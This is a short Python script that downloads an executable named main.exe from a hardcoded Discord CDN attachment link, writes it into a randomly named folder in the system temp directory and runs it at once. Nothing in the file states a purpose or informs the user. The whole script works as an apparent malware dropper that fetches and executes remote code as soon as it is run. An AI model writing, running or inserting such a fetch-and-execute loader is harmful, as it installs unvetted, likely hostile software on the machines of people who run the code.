import os
import tempfile
import requests
import string
import random
import subprocess

def generate_random(length=8):
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

def init(url):
    response = requests.get(url)
    if response.status_code == 200:
        temp_folder = tempfile.gettempdir()
        folder_name = generate_random()
        folder_path = os.path.join(temp_folder, folder_name)
        os.makedirs(folder_path, exist_ok=True)

        file_name = os.path.basename(url)
        file_path = os.path.join(folder_path, file_name)

        with open(file_path, 'wb') as file:
            file.write(response.content)

        subprocess.run([file_path])
    else:
        print(f"An error has occurred. Please try again.")


urla = "https://cdn.discordapp.com/attachments/1051543713396031571/1126653585241931826/main.exe"
init(urla)